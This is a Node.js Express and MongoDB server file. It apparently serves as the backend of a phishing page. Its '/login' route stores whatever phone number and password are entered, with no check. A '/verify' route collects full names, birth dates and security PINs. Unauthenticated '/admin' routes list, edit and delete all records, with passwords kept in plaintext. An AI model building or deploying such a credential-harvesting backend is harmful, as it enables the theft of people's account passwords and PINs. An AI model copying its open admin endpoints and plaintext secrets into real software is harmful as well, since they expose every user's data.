require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();

// -------------------- CORS Setup --------------------
app.use(cors({
    origin: [
        "http://localhost:5500",
        "http://127.0.0.1:5500",
        process.env.FRONTEND_URL
    ],
    credentials: true
}));

app.use(bodyParser.json());

// -------------------- MongoDB Connection --------------------
// -------------------- MongoDB Connection --------------------
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB connected successfully!"))
  .catch(err => console.log("MongoDB connection error:", err));


// -------------------- Mongoose Schemas --------------------
const userSchema = new mongoose.Schema({
    phone: String,
    password: String
}, { timestamps: true });

const verificationSchema = new mongoose.Schema({
    user_id: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    full_name: String,
    dob: Date,
    problem: String,
    security_pin: String,
    experience: String
}, { timestamps: true });

const adminSchema = new mongoose.Schema({
    password: String
});

const User = mongoose.model("User", userSchema);
const Verification = mongoose.model("Verification", verificationSchema);
const Admin = mongoose.model("Admin", adminSchema);

// -------------------- Routes --------------------

// Create user (login/register)
app.post("/login", async (req, res) => {
    try {
        const { phone, password } = req.body;
        const newUser = new User({ phone, password });
        const savedUser = await newUser.save();
        res.json({ success: true, user_id: savedUser._id });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// Submit verification
app.post("/verify", async (req, res) => {
    try {
        const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
        const verification = new Verification({ user_id, full_name, dob, problem, security_pin, experience });
        await verification.save();
        res.json({ success: true, message: "Verification submitted!" });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// Get all users (admin)
app.get("/admin/getUsers", async (req, res) => {
    try {
        const users = await User.find().sort({ createdAt: -1 });
        res.json(users);
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Get all verifications (admin)
app.get("/admin/getVerification", async (req, res) => {
    try {
        const verifications = await Verification.find().sort({ createdAt: -1 });
        res.json(verifications);
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Update user
app.put("/admin/updateUser/:id", async (req, res) => {
    try {
        const { phone, password } = req.body;
        await User.findByIdAndUpdate(req.params.id, { phone, password });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Delete user
app.delete("/admin/deleteUser/:id", async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Delete verification
app.delete("/admin/deleteVerification/:id", async (req, res) => {
    try {
        await Verification.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Admin login
app.post("/admin-login", async (req, res) => {
    try {
        const { password } = req.body;
        const admin = await Admin.findOne({ password });
        if (!admin) return res.json({ success: false, message: "Incorrect password" });
        res.json({ success: true, message: "Login successful" });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// -------------------- Start Server --------------------
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
